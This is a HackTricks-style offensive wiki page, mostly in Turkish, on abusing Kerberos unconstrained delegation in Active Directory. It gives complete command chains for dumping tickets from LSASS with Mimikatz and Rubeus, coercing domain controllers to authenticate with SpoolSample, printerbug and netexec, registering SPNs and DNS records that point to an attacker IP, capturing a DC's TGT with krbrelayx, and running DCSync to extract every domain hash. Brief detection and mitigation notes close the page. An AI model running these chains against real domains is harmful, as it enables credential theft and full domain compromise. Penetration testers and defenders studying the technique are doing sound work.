# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Bu, bir Domain Administrator'ın domain içindeki herhangi bir **Computer** için ayarlayabileceği bir özelliktir. Ardından, bir **user Computer'da login olduğunda**, o kullanıcının **TGT kopyası**, DC tarafından sağlanan **TGS'nin içinde gönderilir** ve **LSASS'te belleğe kaydedilir**. Dolayısıyla, makinede Administrator ayrıcalıklarına sahipseniz, **ticket'ları dump edebilir ve kullanıcıları** herhangi bir makinede **impersonate edebilirsiniz**.

Yani bir Domain Admin, "Unconstrained Delegation" özelliği etkinleştirilmiş bir Computer'da login olursa ve o makinede local admin ayrıcalıklarına sahipseniz, ticket'ı dump edebilir ve Domain Admin'i herhangi bir yerde impersonate edebilirsiniz (domain privesc).

Bu attribute'a sahip Computer object'lerini, [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute'unun [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) içerip içermediğini kontrol ederek **bulabilirsiniz**. Bunu, powerview'in yaptığı gibi, ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filter'ı ile yapabilirsiniz:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Load the ticket của Administrator (hoặc victim user) vào memory bằng **Mimikatz** hoặc **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Thông tin thêm: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team üzerinde Unconstrained delegation hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Bir attacker **"Unconstrained Delegation" için izin verilen bir computer'ı compromise edebilirse**, bir **Print server**'ı ona karşı **otomatik olarak login olmaya** **kandırabilir**; bu işlem server'ın memory'sinde bir **TGT** saklanmasını sağlar.\
Ardından attacker, Print server computer account'unu **impersonate etmek için bir** **Pass the Ticket attack** gerçekleştirebilir.

Bir print server'ın herhangi bir machine'e login olmasını sağlamak için [**SpoolSample**](https://github.com/leechristensen/SpoolSample) kullanabilirsiniz:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
TGT bir domain controller'dan geliyorsa, bir [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) gerçekleştirebilir ve DC'deki tüm hash'leri elde edebilirsiniz.\
[**Bu saldırı hakkında ired.team'de daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Burada **authentication'ı zorlamanın** diğer yollarını bulabilirsiniz:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Kurbanın **Kerberos** ile unconstrained-delegation host'unuza authenticate olmasını sağlayan diğer tüm coercion primitive'leri de işe yarar. Modern ortamlarda bu genellikle klasik PrinterBug akışını, erişilebilir RPC surface'e bağlı olarak **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** veya **WebClient/WebDAV** tabanlı coercion ile değiştirmek anlamına gelir.

### Unconstrained delegation'a sahip bir user/service account'u abuse etme

Unconstrained delegation **computer object'leriyle sınırlı değildir**. Bir **user/service account** da `TRUSTED_FOR_DELEGATION` olarak yapılandırılabilir. Bu senaryoda pratik gereksinim, account'un sahip olduğu bir **SPN** için Kerberos service ticket'ları almasıdır.

Bu, çok yaygın 2 offensive path'e yol açar:

1. Unconstrained-delegation **user account**'ının password/hash'ini ele geçirir, ardından aynı account'a bir **SPN ekleme** yaparsınız.
2. Account'un zaten bir veya daha fazla SPN'i vardır, ancak bunlardan biri **stale/decommissioned hostname**'e işaret eder; eksik **DNS A record**'unu yeniden oluşturmak, SPN set'ini değiştirmeden authentication flow'u hijack etmek için yeterlidir.<sup>[[8]](#references)</sup>

Minimal Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notlar:

- Bu, özellikle unconstrained principal bir **service account** olduğunda ve joined bir host üzerinde code execution değil, yalnızca kimlik bilgileri bulunduğunda oldukça kullanışlıdır.
- Hedef kullanıcıda zaten **stale SPN** varsa, AD'ye yeni bir SPN yazmaktansa ilgili **DNS record**'unu yeniden oluşturmak daha az gürültülü olabilir.
- Güncel Linux merkezli tradecraft `addspn.py`, `dnstool.py`, `krbrelayx.py` ve bir coercion primitive kullanır; zinciri tamamlamak için bir Windows host'a dokunmanız gerekmez.

### Saldırgan tarafından oluşturulan bir computer ile Unconstrained Delegation'ı kötüye kullanma

Modern domain'lerde genellikle `MachineAccountQuota > 0` bulunur (varsayılan değer 10); bu da herhangi bir authenticated principal'ın en fazla N computer object oluşturmasına izin verir. Ayrıca `SeEnableDelegationPrivilege` token privilege'ına (veya eşdeğer haklara) sahipseniz, yeni oluşturulan computer'ı unconstrained delegation için trusted olacak şekilde ayarlayabilir ve privileged system'lerden gelen inbound TGT'leri toplayabilirsiniz.<sup>[[1]](#references)</sup>

Yüksek seviyeli akış:

1) Kontrol ettiğiniz bir computer oluşturun
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Sahte hostname'i domain içinde çözümlenebilir hale getirin
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Saldırganın kontrolündeki bilgisayarda Unconstrained Delegation'ı etkinleştirin
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Neden işe yarar: unconstrained delegation ile delegation-enabled bir bilgisayardaki LSA, gelen TGT'leri önbelleğe alır. Bir DC'yi veya privileged server'ı sahte host'unuza authentication yapması için kandırırsanız, makine TGT'si depolanır ve dışa aktarılabilir.

4) krbrelayx'i export mode'da başlatın ve Kerberos materyalini hazırlayın
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/sunucuların sahte host'unuza authentication yapmasını zorlayın
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx, bir makine kimlik doğrulaması gerçekleştirdiğinde ccache dosyalarını kaydeder, örneğin:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Ele geçirilen DC makinesinin TGT'sini kullanarak DCSync gerçekleştirin
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0`, ayrıcalıksız bilgisayar oluşturmayı etkinleştirir; aksi takdirde açık izinler gerekir.
- Bir bilgisayarda `TRUSTED_FOR_DELEGATION` ayarlamak için `SeEnableDelegationPrivilege` (veya domain admin) gerekir.
- Sahte host'unuz için ad çözümlemesinin (DNS A kaydı) yapılandırıldığından emin olun; böylece DC ona FQDN üzerinden erişebilir.
- Coercion için kullanılabilir bir vector gerekir (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN vb.). Mümkünse bunları DC'lerde devre dışı bırakın.
- Victim hesabı **"Account is sensitive and cannot be delegated"** olarak işaretlenmişse veya **Protected Users** üyesiyse, forwarded TGT service ticket içine dahil edilmez; bu nedenle bu chain yeniden kullanılabilir bir TGT sağlamaz.<sup>[[9]](#references)</sup>
- Kimlik doğrulaması yapan client/server üzerinde **Credential Guard** etkinse Windows, **Kerberos unconstrained delegation**'ı engeller; bu da normalde geçerli olan coercion path'lerinin operator açısından başarısız olmasına neden olabilir.

Detection ve hardening fikirleri:

- UAC `TRUSTED_FOR_DELEGATION` ayarlandığında Event ID 4741 (computer account oluşturuldu) ve 4742/4738 (computer/user account değiştirildi) olayları için alert oluşturun.
- Domain zone içinde olağandışı DNS A-record eklemelerini izleyin.
- Beklenmeyen host'lardan gelen 4768/4769 artışlarını ve DC'lerin DC olmayan host'lara yaptığı authentication işlemlerini takip edin.
- `SeEnableDelegationPrivilege` yetkisini minimum bir kullanıcı kümesiyle sınırlandırın, mümkün olan yerlerde `MachineAccountQuota=0` ayarlayın ve DC'lerde Print Spooler'ı devre dışı bırakın. LDAP signing ve channel binding uygulayın.

### Mitigation

- DA/Admin login işlemlerini belirli servislerle sınırlandırın.
- Ayrıcalıklı hesaplar için **"Account is sensitive and cannot be delegated"** ayarını etkinleştirin.

## Referanslar

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Unrestricted delegation üzerinden domain compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Active Directory'de Unconstrained Delegation](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – DC print server ve Kerberos delegation üzerinden domain compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
